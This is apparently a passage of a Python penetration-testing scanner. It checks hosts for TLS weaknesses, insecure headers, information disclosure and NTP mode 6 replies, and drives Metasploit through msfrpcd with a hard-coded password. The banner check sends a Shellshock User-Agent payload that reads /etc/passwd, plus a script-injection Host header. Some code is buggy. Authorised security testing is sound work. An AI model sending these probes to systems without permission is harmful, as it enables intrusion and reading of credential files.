import sys
import subprocess
import os
from requests import Session, Request
import re
import urllib3
import argparse
#from pymetasploit3.msfrpc import MsfRpcClient
import socket
from OpenSSL import SSL
from service_identity import VerificationError
from cryptography import x509
from cryptography.x509.oid import NameOID
import idna
import signal
import concurrent.futures
from collections import namedtuple
import requests
import threading
import queue
from datetime import datetime, timedelta
import time
import xlsxwriter
from random import randrange
from scapy.all import *
#from socket import socket
import socket 
from memory_profiler import profile

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#HTTPS Enforced check
#sweet32, logjam, beast
#HTTP Trace enabled
#BIGIP timeout 
#BIGIP grep for port
#Resume Function
#ssl check https://gist.github.com/gdamjan/55a8b9eec6cf7b771f92021d93b87b2c

start=time.time()

ipList = set()
expiredCerts = {}
soonToExpireCerts = {}
anonCiphersStore = {}
httpsNotEnforced = {}
httpsNotEnabled = {}
verboseServerBannerContentStore = {}
verboseServerBannerStore = {}
hostHeaderInjectionStore = {}
HSTSMisconfig = {}
internalIPDisclosureStore = {}
bigIPDisclosureStore = {}
ssrfStore = {} 
verboseServerErrorStore = {}
extractPathStore = {}
TLS1 = {}
SSL3 = {}
SSL2 = {}
ntpStore = {}
numerOfRedirects = 0
missingOrInsecureHeaders = {}

workbook = xlsxwriter.Workbook('Vulnerability_Results.xlsx') 
bold = workbook.add_format({'bold': True})
cell_format = workbook.add_format()
cell_format.set_text_wrap()
worksheet = workbook.add_worksheet("SSL Vulnerabilities") 
worksheetWeb = workbook.add_worksheet("Web Vulnerabilities") 
worksheetNetwork = workbook.add_worksheet("Network Vulnerabilities") 
worksheet.write(0, 0, "Certificate Expired", bold)
worksheet.write(0, 1, "All information", bold)
worksheet.write(0, 3, "Certificate will expire soon", bold)
worksheet.write(0, 4, "All information", bold)
worksheet.write(0, 6, "Anonymous SSL/TLS ciphers supported", bold)
worksheet.write(0, 7, "All information", bold)
worksheet.write(0, 9, "HTTPS Not Enabled", bold)
worksheet.write(0, 10, "All information", bold)
worksheet.write(0, 12, "HTTPS Not Enforced", bold)
worksheet.write(0, 13, "All information", bold)
worksheet.write(0, 15, "HSTS Missing or Misconfigured", bold)
worksheet.write(0, 16, "All information", bold)
worksheet.write(0, 18, "SSLv2 Enabled", bold)
worksheet.write(0, 19, "SSLv3 Enabled", bold)
worksheet.write(0, 20, "TLSv1.0 Enabled", bold)

worksheetWeb.write(0, 0, "Verbose Server Banner", bold)
worksheetWeb.write(0, 1, "Disclosed Header", bold)
worksheetWeb.write(0, 3, "Verbose Server Banner in Response", bold)
worksheetWeb.write(0, 4, "Request Headers", bold)
worksheetWeb.write(0, 6, "Host Header Injection", bold)
worksheetWeb.write(0, 7, "Request Headers", bold)
worksheetWeb.write(0, 9, "Internal IP Disclosure", bold)
worksheetWeb.write(0, 10, "Disclosed IP Address", bold)
worksheetWeb.write(0, 12, "BigIP Cookie Internal IP Disclosure", bold)
worksheetWeb.write(0, 13, "Disclosed IP Address", bold)
worksheetWeb.write(0, 15, "Server Side Request Forgery", bold)
worksheetWeb.write(0, 16, "Vulnerable parameter", bold)
worksheetWeb.write(0, 18, "Verbose Server Error", bold)
worksheetWeb.write(0, 19, "Exception", bold)
worksheetWeb.write(0, 21, "Internal Path Disclosure", bold)
worksheetWeb.write(0, 22, "Exception", bold)
worksheetWeb.write(0, 24, "Missing or Misconfigured Headers", bold)
worksheetWeb.write(0, 25, "Information", bold)

worksheetNetwork.write(0, 0, "Network Time Protocol (NTP) Mode 6 Scanner", bold)
worksheetNetwork.write(0, 1, "Response", bold)


#Helper Functions
def proxyError(e, method):
	
	if "Cannot connect to proxy" in str(e):
		
		if method == "scan":
			print("\nCannot connect to proxy\n\nPlease enable proxy to continue scanning\n")
			sys.exit()

		else:	
			address = "https://www.google.com"
		
			while True:
				try:
					headers = None
					proxyCheck = oneRequest(headers, address)

					if proxyCheck.status_code:
						break
					else:
						
						time.sleep(2)
						continue

				except Exception as e:

					if "Cannot connect to proxy" in str(e):
						
						time.sleep(2)
						continue
					else:
						break
			return

	else:		
		return


def portOpenCheck(IP, port):

	target = IP
	#ip = socket.gethostbyname(target)

	def portscan(port):

	    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	    s.settimeout(0.5)# 

	    try:
	    	con = s.connect((target,port))
	    	
	    	print('Port :',port,"is open.")
	    	con.close()
	    except Exception as e: 
	    	
	    	pass
	r = 1 

	for x in range(1,100): 

	    t = threading.Thread(target=portscan,kwargs={'port':r}) 

	    r += 1     
	    t.start() 


def oneRequest(headers, address):

	if headers != None:
		result = requests.get(address, verify=False, headers=headers, proxies=proxyDict, allow_redirects=False, timeout=(5, 8))
	else:	
		result = requests.get(address, verify=False, proxies=proxyDict, allow_redirects=False, timeout=(5, 8))
	
	return result


def allRedirectRequests(headers, IP, port, redirectUrl):
	

	redirectUrl1 = str(redirectUrl.url)

	if "location" in str(redirectUrl.headers).lower() and "https" not in str(redirectUrl.headers["Location"]) and "http" not in str(redirectUrl.headers["Location"]):
		redirectUrl1 = "{}{}".format(str(redirectUrl.url), str(redirectUrl.headers["Location"]))
		#print(redirectUrl1)

	elif "location" in str(redirectUrl.headers).lower():
		redirectUrl1 = str(redirectUrl.url)
		#print(redirectUrl1)
	
	try:
	
		redirectData = requests.get(redirectUrl1, verify=False, proxies=proxyDict, headers=headers, allow_redirects=True, timeout=(5, 8))

		return redirectData

	except Exception as e:
		 
		replace = 1
		return None


def extractPath(data, IP, port, fromMethod):

	regWin = (re.findall( r'([a-zA-Z]:)?(\\[a-zA-Z0-9_-]+)+\\?', str(data)))

	regLinux = (re.findall( r'^(/[^/ ]*)+/?$', str(data)))

	if regLinux == []:
		return

	else:
		print ("\t-> Internal Path Disclosure")
		instance = "{}:{}".format(IP, port)
		extractPathStore.update({instance:str(regLinux)})


	if regWin == []:
		return

	else:
		print ("\t-> Internal Path Disclosure")
		instance = "{}:{}".format(IP, port)
		extractPathStore.update({instance:str(regWin)})


def extractIP(extractIPFromString, IP, port, data):

	regex = (re.findall( r'(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3})', str(extractIPFromString)))
	import json

	for ip in regex:

		#list_port = [ k for k in port ]
		if ip.startswith("10.") or ip.startswith("192.168."):
			print ("\t-> Internal IP Found")
			ipList.add(ip)

			if data == "iid":
				instance = "{}:{}".format(IP, port)
				internalIPDisclosureStore.update({instance:str(ip)})

			if data == "msfconsole":
				instance = "{}:{}".format(IP, port)
				bigIPDisclosureStore.update({instance:str(ip)})

		elif ip.startswith("172.") and int(ip.split(".")[1]) >= 16 and int(ip.split(".")[1]) <= 31:
			print ("\t-> Internal IP Found")
			ipList.add(ip)

			if data == "iid":
				instance = "{}:{}".format(IP, port)
				internalIPDisclosureStore.update({instance:str(ip)})

			if data == "msfconsole":
				instance = "{}:{}".format(IP, port)
				bigIPDisclosureStore.update({instance:str(ip)})
	
	return ipList


def msfconsole(IP, port):
	
	try:
		client = MsfRpcClient('toortoor', port=55553, ssl=True)
	except:
		return

	exploit = client.modules.use('auxiliary','gather/f5_bigip_cookie_disclosure')
	exploit['RHOSTS'] = IP
	exploit['RPORT'] = int(port)
	exploit['SSL']= False

	try:
		console_id = client.consoles.console().cid
		console = client.consoles.console(console_id)
		extractIP(console.run_module_with_output(exploit), IP, port, "msfconsole")

	except:
		print ("Connection failed")


def hstsCheck(data, IP, port):
		
	if 'strict-transport-security' not in data.headers:
		print("	-> HSTS Header Missing")
		instance = "{}:{}".format(IP, port)
		HSTSMisconfig.update({instance:"Missing"})

	else:
		values = data.headers['strict-transport-security']
		max_age = int("".join(filter(str.isdigit, values)))
		
		if 'max-age' not in data.headers['strict-transport-security'] or max_age < 10886400:
			print ("\t-> HSTS not implemented properly: max-age should be at least eighteen weeks")
			instance = "{}:{}".format(IP, loopPorts)
			HSTSMisconfig.update({instance:"Misconfigured"})

		else:
			print ("\t-> HSTS implemented correctly")


#Network Functions
def ntpMode6(IPAddress):

	ntpserver = IPAddress
	data = "\x16\x02\x00\x01" + "\x00" * 8
	
	packets = IP(dst=ntpserver)/UDP(sport=48947,dport=123)/Raw(load=data) 
	send(packets, verbose=0)
	resultNTP = sniff(iface="eth0",timeout = 2)

	try:
		for i in range (0,9):
					
			if "processor" in str(resultNTP[i]) and "rootdelay" in str(resultNTP[i]):
				print("\t-> NTP Server replied to Mode 6 queries. Potential to be used in NTP amplification attacks")
				instance = str(IPAddress) + ":123u"
				ntpStore.update({instance:str(resultNTP[i])})
				break

	except Exception as e:
			replace = 1
			return


#SSL Functions
def anonCiphers(IP, port):

	try:
		import nmap
		
		argument = "-Pn -sV --script ssl-enum-ciphers -p%s" %port

		nm = nmap.PortScanner()
		nm.scan(IP, arguments=argument)

		storeResult = nm[IP]['tcp'][int(port)]

		#Print nmap result Dictionary
		#print(storeResult.get('script', {}).get('ssl-enum-ciphers'))

		storeResult = storeResult.get('script', {}).get('ssl-enum-ciphers')
		#print(nm[IP]['tcp'][int(port)])
		
		if "SSLv2:" in str(storeResult):
				instance =  "{}:{}".format(IP, port)
				SSL2.update({instance:str(storeResult)})

		if "SSLv3:" in str(storeResult):
				instance = "{}:{}".format(IP, port)
				SSL3.update({instance:str(storeResult)})

		if "TLSv1.0:" in str(storeResult):
				instance = "{}:{}".format(IP, port)
				TLS1.update({instance:str(storeResult)})

		if "least strength:" in str(storeResult):
			if "least strength: C" in str(storeResult):
				print("\t-> Anonymous SSL/TLS Ciphers Enabled")
				instance = "{}:{}".format(IP, port)
				anonCiphersStore.update({instance:str(storeResult)})
			else:
				print("\t-> Anonymous SSL/TLS Ciphers not Enabled")
			

		else:
			return
	except Exception as e:
		 
		replace = 1
		return


def hsts(data, IP, port, status):

				
	if "https" in status or "ssl" in status:
		
		try:
			hstsCheck(data, IP, port)

		except requests.exceptions.RequestException as e:
			 
			replace = 1
			exception = 1
			
	else:
		return


def httpsEnforced(IP, port):

	headers = {'Host': 'www.oteri.com', 'Upgrade-Insecure-Requests':'1', \
	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36',\
	'Connection': 'close'} 
	#print(IP, port)
	
	address = "http://{}:{}".format(IP, port)
	
	try:
		SSLcon = oneRequest(headers, address)
	
		if "location" in str((SSLcon.headers)).lower():

			if "https" in SSLcon.headers['Location']:
				print ("\t-> HTTPS Enforced")

			else:
				enabled = 1
				try:
					addreSSL = "https://{}:{}".format(IP, port)
					SSLcon = oneRequest(headers, addreSSL)

				except:	
					enabled = 0
					print("\t-> HTTPS not Enabled")
					instance = "{}:{}".format(IP, port)
					httpsNotEnabled.update({instance:"Disabled"})
				
				if enabled == 1:
					print("\t-> HTTPS not Enforced")
					instance = "{}:{}".format(IP, port)
					httpsNotEnforced.update({instance:"Enabled"})

	except requests.exceptions.RequestException as e:
		 
		replace = 1
		exception = 1
		proxyError(e, "")
		

@profile
def ssl(IP, loopPorts, status):

	print ("\n[*] SSL/TLS Check")
	HostInfo = namedtuple(field_names='cert hostname peername', typename='HostInfo')
	from socket import socket
	#print(port.get(loopPorts))
	if "https" in status or "ssl" in status:
		
		HOSTS = [(IP, int(loopPorts))]
			
		try:
			def get_certificate(hostname, port):

			    hostname_idna = idna.encode(hostname)
			    sock = socket()

			    sock.connect((hostname, port))
			    peername = sock.getpeername()
			    ctx = SSL.Context(SSL.SSLv23_METHOD) # most compatible
			    ctx.check_hostname = False
			    ctx.verify_mode = SSL.VERIFY_NONE

			    sock_ssl = SSL.Connection(ctx, sock)
			    sock_ssl.set_connect_state()
			    sock_ssl.set_tlsext_host_name(hostname_idna)				    
			    sock_ssl.do_handshake()
			    cert = sock_ssl.get_peer_certificate()
			    crypto_cert = cert.to_cryptography()
			    sock_ssl.close()
			    sock.close()

			    return HostInfo(cert=crypto_cert, peername=peername, hostname=hostname)

			def get_alt_names(cert):
			    
			    try:
			        ext = cert.extensions.get_extension_for_class(x509.SubjectAlternativeName)
			        return ext.value.get_values_for_type(x509.DNSName)
			    except x509.ExtensionNotFound:
			        return None

			def get_common_name(cert):
			    
			    try:
			        names = cert.subject.get_attributes_for_oid(NameOID.COMMON_NAME)
			        return names[0].value
			    except x509.ExtensionNotFound:
			        return None

			def get_issuer(cert):
			    
			    try:
			        names = cert.issuer.get_attributes_for_oid(NameOID.COMMON_NAME)
			        return names[0].value
			    except x509.ExtensionNotFound:
			        return None


			def print_basic_info(hostinfo):


			    #print(hostinfo.cert.not_valid_after)
			    datetimes = hostinfo.cert.not_valid_after
			    datetimes = str(datetimes)
			    datetimes = datetimes.split(" ")
			    datetimes = datetimes[0].split("-")
			    present = datetime.now()
			    #print(datetimes[0])
			    #print(datetime(int(datetimes[0]), int(datetimes[1]), int(datetimes[2])) < present)

			    s = '''\n» {hostname} « … {peername}
			    \tcommonName: {commonname}
			    \tSAN: {SAN}
			    \tissuer: {issuer}
			    \tnotBefore: {notbefore}
			    \tnotAfter:  {notafter}
			    '''.format(
			            hostname=hostinfo.hostname,
			            peername=hostinfo.peername,
			            commonname=get_common_name(hostinfo.cert),
			            SAN=get_alt_names(hostinfo.cert),
			            issuer=get_issuer(hostinfo.cert),
			            notbefore=hostinfo.cert.not_valid_before,
			            notafter=hostinfo.cert.not_valid_after
			    )
			    print(s)


			    if (datetime(int(datetimes[0]), int(datetimes[1]), int(datetimes[2])) < present) == True:
			    	print("\t-> Certificate Expired")
			    	instance = "{}:{}".format(IP, loopPorts)
			    	expiredCerts.update({instance:str(s)})


			    daysRemaining = str(datetime(int(datetimes[0]), int(datetimes[1]), int(datetimes[2])) - present)
			    daysRemaining = daysRemaining.split(" ")
			    
			    if int(daysRemaining[0]) <= 60:
			    	print("\t-> Certificate will expire in less than 60 days")
			    	instance = "{}:{}".format(IP, loopPorts)
			    	soonToExpireCerts.update({instance:str(s)})



			def check_it_out(hostname, port):
			    hostinfo = get_certificate(hostname, port)
			    print_basic_info(hostinfo)


			with concurrent.futures.ThreadPoolExecutor(max_workers=4) as e:
				for hostinfo in e.map(lambda x: get_certificate(x[0], x[1]), HOSTS):
					print_basic_info(hostinfo)
	
		
		except Exception as e:
			 
			count = "buff!"
			#print(loopPorts)
			replace = 1
			
		anonCiphers(IP, loopPorts)
		httpsEnforced(IP, loopPorts)

	else:
		httpsEnforced(IP, loopPorts)


#All Header Functions
def cacheControl(data, IP, loopPorts):

	if "Cache-Control" in str(data.headers):
		
		if "no-cache" in str(data.headers["Cache-Control"]) and "no-store" in str(data.headers["Cache-Control"]):
			print("\t-> Cache control set correctly")
		
		else:
			print("\t-> Cache control set incorrectly")
			instance = "{}:{}".format(IP, loopPorts)
			
			if missingOrInsecureHeaders.get(instance):
				newValue = "{}, {}".format(str(missingOrInsecureHeaders.get(instance)), "Cache-Control: Misconfigured")
				missingOrInsecureHeaders.update({instance:newValue})
			
			else:
				missingOrInsecureHeaders.update({instance:"Cache-Control: Misconfigured"})

	elif "cache-control" in str(data.headers):
		
		if "no-cache" in str(data.headers["cache-control"]) and "no-store" in str(data.headers["cache-control"]):
			print("\t-> Cache control set correctly")
		
		else:
			print("\t-> Cache control set incorrectly")
			instance = "{}:{}".format(IP, loopPorts)
			
			if missingOrInsecureHeaders.get(instance):
				newValue = "{}, {}".format(str(missingOrInsecureHeaders.get(instance)), "Cache-Control: Misconfigured")
				missingOrInsecureHeaders.update({instance:newValue})
			
			else:
				missingOrInsecureHeaders.update({instance:"Cache-Control: Misconfigured"})

	else:
		print("\t-> Cache control Header Missing")
		instance = "{}:{}".format(IP, loopPorts)
		if missingOrInsecureHeaders.get(instance):
			newValue = "{}, {}".format(str(missingOrInsecureHeaders.get(instance)), "Cache-Control: Missing")
			missingOrInsecureHeaders.update({instance:newValue})
	
		else:
			missingOrInsecureHeaders.update({instance:"Cache-Control: Missing"})


def originHeaderCORS(data, IP, loopPorts):

	if "Access-Control-Allow-Origin" in str(data.headers):
		
		if "*" in str(data.headers["Access-Control-Allow-Origin"]):
			print("\t-> Misconfigured CORS")
			instance = "{}:{}".format(IP, loopPorts)
			
			if missingOrInsecureHeaders.get(instance):
				newValue = "{}, {}".format(str(missingOrInsecureHeaders.get(instance)), "Access-Control-Allow-Origin: Misconfigured - Broadly Scoped Origin")
				missingOrInsecureHeaders.update({instance:newValue})
			
			else:
				missingOrInsecureHeaders.update({instance:"Access-Control-Allow-Origin: Misconfigured - Broadly Scoped Origin"})

		elif "www.custom-origin-header.com" in str(data.headers["Access-Control-Allow-Origin"]):
			print("\t-> Misconfigured CORS")
			instance = "{}:{}".format(IP, loopPorts)
			
			if missingOrInsecureHeaders.get(instance):
				newValue = "{}, {}".format(str(missingOrInsecureHeaders.get(instance)), "Access-Control-Allow-Origin: Misconfigured - Origin reflected")
				missingOrInsecureHeaders.update({instance:newValue})
			
			else:
				missingOrInsecureHeaders.update({instance:"Access-Control-Allow-Origin: Misconfigured - Origin reflected"})

	elif "Timing-Allow-Origin" in str(data.headers):
		
		if "*" in str(data.headers["Timing-Allow-Origin"]):
			print("\t-> Misconfigured CORS")
			instance = "{}:{}".format(IP, loopPorts)

			if missingOrInsecureHeaders.get(instance):
				newValue = "{}, {}".format(str(missingOrInsecureHeaders.get(instance)), "Timing-Allow-Origin: Misconfigured - Broadly Scoped Origin")
				missingOrInsecureHeaders.update({instance:newValue})
			
			else:
				missingOrInsecureHeaders.update({instance:"Timing-Allow-Origin: Misconfigured - Broadly Scoped Origin"})

		elif "www.custom-origin-header.com" in str(data.headers["Timing-Allow-Origin"]):
			print("\t-> Misconfigured CORS")
			instance = "{}:{}".format(IP, loopPorts)

			if missingOrInsecureHeaders.get(instance):
				newValue = "{}, {}".format(str(missingOrInsecureHeaders.get(instance)), "Timing-Allow-Origin: Misconfigured - Origin reflected")
				missingOrInsecureHeaders.update({instance:newValue})
			
			else:
				missingOrInsecureHeaders.update({instance:"Timing-Allow-Origin: Misconfigured - Origin reflected"})

	elif "www.custom-origin-header.com" in str(data.headers) or "www.custom-origin-header.com" in str(data.content):
			print("\t-> Misconfigured CORS - Please review")
			instance = "{}:{}".format(IP, loopPorts)

			if missingOrInsecureHeaders.get(instance):
				newValue = "{}, {}".format(str(missingOrInsecureHeaders.get(instance)), "CORS 'Origin' header reflected: Please check")
				missingOrInsecureHeaders.update({instance:newValue})
			
			else:
				missingOrInsecureHeaders.update({instance:"CORS 'Origin' header reflected: Please check"})

	else:
		print("\t-> No CORS misconfigurations detected")

			
def xForwardedFor(data, IP, loopPorts):

	if "X-Forwarded-For" in str(data.headers):
		
		if "100.100.100.100" in str(data.headers["X-Forwarded-For"]):
			print("\t-> X-Forwarded-For: Potential IP Spoofing")
			instance = "{}:{}".format(IP, loopPorts)

			if missingOrInsecureHeaders.get(instance):
				newValue = "{}, {}".format(str(missingOrInsecureHeaders.get(instance)), "X-Forwarded-For: Potential IP Spoofing")
				missingOrInsecureHeaders.update({instance:newValue})
			
			else:
				missingOrInsecureHeaders.update({instance:"X-Forwarded-For: Potential IP Spoofing"})

	elif "100.100.100.100" in str(data.headers)	or "100.100.100.100" in str(data.content):
		print("\t-> X-Forwarded-For value reflected - Please review")
		instance = "{}:{}".format(IP, loopPorts)

		if missingOrInsecureHeaders.get(instance):
			newValue = "{}, {}".format(str(missingOrInsecureHeaders.get(instance)), "X-Forwarded-For: Value reflected - Please check")
			missingOrInsecureHeaders.update({instance:newValue})
		
		else:
			missingOrInsecureHeaders.update({instance:"X-Forwarded-For: Value reflected - Please check"})


def csp(data, IP, loopPorts):

	if "Content-Security-Policy" in str(data.headers):
		
		if "unsafe-inline" in str(data.headers["Content-Security-Policy"]) or  "unsafe-eval" in str(data.headers["Content-Security-Policy"]):
			print("\t-> Misconfigured Content-Security-Policy")
			instance = "{}:{}".format(IP, loopPorts)

			if missingOrInsecureHeaders.get(instance):
				newValue = "{}, {}".format(str(missingOrInsecureHeaders.get(instance)), "Content-Security-Policy: Misconfigured")
				missingOrInsecureHeaders.update({instance:newValue})
			
			else:
				missingOrInsecureHeaders.update({instance:"Content-Security-Policy: Misconfigured"})

	elif "content-security-policy" in str(data.headers):
		
		if "unsafe-inline" in str(data.headers["content-security-policy"]) or  "unsafe-eval" in str(data.headers["content-security-policy"]):
			print("\t-> Misconfigured Content-Security-Policy")
			instance = "{}:{}".format(IP, loopPorts)

			if missingOrInsecureHeaders.get(instance):
				newValue = "{}, {}".format(str(missingOrInsecureHeaders.get(instance)), "Content-Security-Policy: Misconfigured")
				missingOrInsecureHeaders.update({instance:newValue})
			
			else:
				missingOrInsecureHeaders.update({instance:"Content-Security-Policy: Misconfigured"})

	else:
		print("\t-> Content-Security-Policy Header Missing")
		instance = "{}:{}".format(IP, loopPorts)

		if missingOrInsecureHeaders.get(instance):
			newValue = "{}, {}".format(str(missingOrInsecureHeaders.get(instance)), "Content-Security-Policy: Missing")
			missingOrInsecureHeaders.update({instance:newValue})
		
		else:
			missingOrInsecureHeaders.update({instance:"Content-Security-Policy: Missing"})


def clickjacking(data, IP, loopPorts):

	if "X-Frame-Options" in str(data.headers):
		
		if "deny" in str(data.headers["X-Frame-Options"]).lower() or "sameorigin" in str(data.headers["X-Frame-Options"]).lower() or "allow-from" in str(data.headers["X-Frame-Options"]).lower():
			
			if "*" in str(data.headers["X-Frame-Options"]).lower():
				print("\t-> Misconfigured X-Frame-Options")
				instance = "{}:{}".format(IP, loopPorts)

				if missingOrInsecureHeaders.get(instance):
					newValue = "{}, {}".format(str(missingOrInsecureHeaders.get(instance)), "X-Frame-Options: Misconfigured")
					missingOrInsecureHeaders.update({instance:newValue})
				
				else:
					missingOrInsecureHeaders.update({instance:"X-Frame-Options: Misconfigured"})
			
			else:
				print("\t-> X-Frame-Options Present")
		
		else:	 
			print("\t-> Misconfigured X-Frame-Options")
			instance = "{}:{}".format(IP, loopPorts)
			
			if missingOrInsecureHeaders.get(instance):
				newValue = "{}, {}".format(str(missingOrInsecureHeaders.get(instance)), "X-Frame-Options: Misconfigured")
				missingOrInsecureHeaders.update({instance:newValue})
			
			else:
				missingOrInsecureHeaders.update({instance:"X-Frame-Options: Misconfigured"})

	elif "Content-Security-Policy" in str(data.headers):
		
		if "frame-ancestors" in str(data.headers["Content-Security-Policy"]):
			print("\t-> Frame ancestors: CSP present")

	else:
		print("\t-> Vulnerable to Clickjacking")
		instance = "{}:{}".format(IP, loopPorts)

		if missingOrInsecureHeaders.get(instance):
			newValue = "{}, {}".format(str(missingOrInsecureHeaders.get(instance)), "X-Frame-Options: Missing")
			missingOrInsecureHeaders.update({instance:newValue})
		
		else:
			missingOrInsecureHeaders.update({instance:"X-Frame-Options: Missing"})


def allSecurityHeaderChecks(data, IP, loopPorts, status):

	cacheControl(data, IP, loopPorts)

	originHeaderCORS(data, IP, loopPorts)

	xForwardedFor(data, IP, loopPorts)

	csp(data, IP, loopPorts)

	clickjacking(data, IP, loopPorts)

	hsts(data, IP, loopPorts, status)


@profile
def allSecurityHeaders(IP, loopPorts, status):

	print("\n[*] All Header Checks")
	
	headers = {'Upgrade-Insecure-Requests':'1', 'Origin': 'www.custom-origin-header.com', 'X-Forwarded-For':'100.100.100.100', \
		'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',\
		'Accept-Encoding':'gzip, deflate',\
		'User-Agent':"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36",\
		'Connection': 'close'} 
	

	if "https" in status or "ssl" in status:
		
		SSLaddress = "https://{}:{}".format(IP, loopPorts)
		try:
			dataSSL = requests.get(SSLaddress, headers=headers, proxies=proxyDict, verify=False, allow_redirects=True, timeout=(5, 8))
			allSecurityHeaderChecks(dataSSL, IP, loopPorts, status)
		
		except Exception as e:
			 
			replace = 1
			proxyError(e, "")
			

	else:
		
		address = "http://{}:{}".format(IP, loopPorts)

		try:
			data = requests.get(address, headers=headers, proxies=proxyDict, verify=False, allow_redirects=True, timeout=(5, 8))
			allSecurityHeaderChecks(data, IP, loopPorts, status)
		
		except Exception as e:
			 
			replace = 1
			proxyError(e, "")
			


def BIGIPcookieInformationDisclosure(IP, port, status):

	print ("\n[*] BIGIP Cookie Information Disclosure Check")
#	IP = "199.255.140.183"
	
	import nmap

	argument = "-Pn -p 55553"

	nm = nmap.PortScanner()
	nm.scan('127.0.0.1', arguments=argument)
	#print(nm['127.0.0.1']['tcp'][55553])
	p55553 = nm['127.0.0.1']['tcp'][55553]
	
	if p55553.get("state") == "open":
		print ("\t-> msfrpcd port open")
	else:
		print ("\t-> Starting msfrpcd on port 55553")
		os.system("msfrpcd -P toortoor")
	
	msfconsole(IP, port)

@profile
def internalIPAddressDisclosure(IP, loopPorts, status, args):
	
	print ("\n[*] Internal  IP  Disclosure Check")

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.settimeout(5.0)

	if "https" in status or "ssl" in status:
		try:
			s.connect((IP , int(loopPorts)))

			s.sendall(b"GET / HTTP/1.0\r\n\r\n")
			http1_0 =  s.recv(4096)
			extractIP(http1_0, IP, loopPorts, "iid")
			extractPath(http1_0, IP, loopPorts, "iid")

			s.sendall(b"GET / HTTP/1.1\r\n\r\n")
			http1_1 =  s.recv(4096)
			extractIP(http1_1, IP, loopPorts, "iid")
			extractPath(http1_1, IP, loopPorts, "iid")

		except Exception as e:
			 
			exception = 1
			#replace = 1

	else:
		try:
			s.connect((IP , int(loopPorts)))
			s.sendall(b"GET / HTTP/1.0\r\n\r\n")
			http1_0 =  s.recv(4096)
			extractIP(http1_0, IP, loopPorts, "iid")
			extractPath(http1_0, IP, loopPorts, "iid")

			s.sendall(b"GET / HTTP/1.1\r\n\r\n")
			http1_1 =  s.recv(4096)
			extractIP(http1_1, IP, loopPorts, "iid")
			extractPath(http1_1, IP, loopPorts, "iid")
	
		except Exception as e:
			  
			exception = 1
			#replace = 1

@profile
def verboseServerBannerCheck(data, IP, protocol, port):
	
	if "Server" in data.headers:
	
		if data.headers["Server"] != "":
			print ("\t-> Verbose Server Banner: {}:{}".format(protocol, port))
			instance = "{}:{}".format(IP, port)
			banner = "Server: {}".format(data.headers["Server"])
			verboseServerBannerStore.update({instance:banner})

			if "apache" in  str(data.headers['Server']).lower():
				
				print("\t\t-> Apache server")
				if "/" in data.headers['Server']:
					splitValue = data.headers['Server'].split('/')
					#output = subprocess.check_output(['searchsploit',splitValue[0],splitValue[1]])
					#instance = "{}:{}".format(IP, port)
					#searchsploitResults.update({instance:output})
					
				else:
					okay = 1
					#output = subprocess.check_output(['searchsploit',data.headers['Server']])
					#instance = "{}:{}".format(IP, port)
					#searchsploitResults.update({instance:output})
					

			elif "iis" in  str((data.headers['Server'])).lower():
				print("\t\t-> IIS server")

				if "/" in data.headers['Server']:
					splitValue = data.headers['Server'].split('/')
					#output = subprocess.check_output(['searchsploit',splitValue[0],splitValue[1]])
					#instance = "{}:{}".format(IP, port)
					#searchsploitResults.update({instance:output})

				else:
					#output = subprocess.check_output(['searchsploit',data.headers['Server']])
					#instance = "{}:{}".format(IP, port)
					#searchsploitResults.update({instance:output})
					okay = 1

			else:
				print("\t\t-> Unknown Server")
				if "/" in data.headers['Server']:
					splitValue = data.headers['Server'].split('/')
					#output = subprocess.check_output(['searchsploit',splitValue[0],splitValue[1]])
					#instance = "{}:{}".format(IP, port)
					#searchsploitResults.update({instance:output})

				else:
					#output = subprocess.check_output(['searchsploit',data.headers['Server']])
					#instance = "{}:{}".format(IP, port)
					#searchsploitResults.update({instance:output})
					okay = 1

		if "X-AspNet-Version" in data.headers:
			if data.headers["X-AspNet-Version"] != "":
				print("\t-> Verbose Software Version: {}".format(protocol))
				instance = "{}:{}".format(IP, port)
				banner = "X-AspNet-Version: {}".format(data.headers["X-AspNet-Version"])
				verboseServerBannerStore.update({instance:banner})

		if "X-Powered-By" in data.headers:
			if data.headers["X-Powered-By"] != "":
				print("\t-> Verbose Server Banner: {}".format(protocol))
				instance = "{}:{}".format(IP, port)
				banner = "X-Powered-By: {}".format(data.headers["X-Powered-By"])
				verboseServerBannerStore.update({instance:banner})

		customAddress = "http://{}/customdirectory".format(IP)
		customAddresshttps = "https://{}/customdirectory".format(IP)
		customAddress1 = "http://{}/customdirectory!@$%^&*()_+-=[]//|;':/,./><~`".format(IP)
		customAddresshttps1 = "https://{}/customdirectory!@$%^&*()_+-=[]//|;':/,./><~`".format(IP)
		customAddressUserAgent = "http://{}".format(IP)
		customAddresshttpsUserAgent = "https://{}".format(IP)

		headers = {'Host': IP, 'Upgrade-Insecure-Requests':'1', \
	'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',\
	'Accept-Encoding':'gzip, deflate',\
	'User-Agent':"() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'",\
	'Connection': 'close'} 
		
		headers1 = {'Host': '<script>alert()</script>', 'Upgrade-Insecure-Requests':'1', \
	'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',\
	'Accept-Encoding':'gzip, deflate',\
	'User-Agent':"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36",\
	'Connection': 'close'} 

	
		data = oneRequest(None, customAddress)

		try:
			if "apache" in str((data.content)).lower() or "asp.net" in str((data.content)).lower():
				print ("\t-> Verbose Server Banner in content")
				instance = "{}:{}".format(IP, port)
				verboseServerBannerContentStore.update({instance:str(data.request.headers)})

			if protocol == "https":
				data1 = oneRequest(None, customAddresshttps)

